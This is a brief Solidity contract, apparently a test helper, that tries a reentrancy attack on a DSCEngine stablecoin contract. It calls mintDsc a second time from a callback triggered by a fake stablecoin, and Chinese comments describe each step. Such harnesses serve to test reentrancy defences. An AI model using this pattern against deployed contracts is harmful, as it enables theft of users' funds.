// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {DSCEngine} from "../../src/DSCEngine.sol";

contract AttackDSCEngine {
    DSCEngine public dsce;
    bool public attacked;

    constructor(address _dsce) {
        dsce = DSCEngine(_dsce);
    }

    function startAttack() external {
        require(!attacked, "Already attacked");
        attacked = true;

        // 第一次调用 mintDsc，会触发 FakeStableCoin 的回调
        dsce.mintDsc(1 ether);
    }

    // 被 FakeStableCoin 回调后执行
    function attack() external {
        // 第二次调用 mintDsc，重入发生
        dsce.mintDsc(1 ether);
    }
}
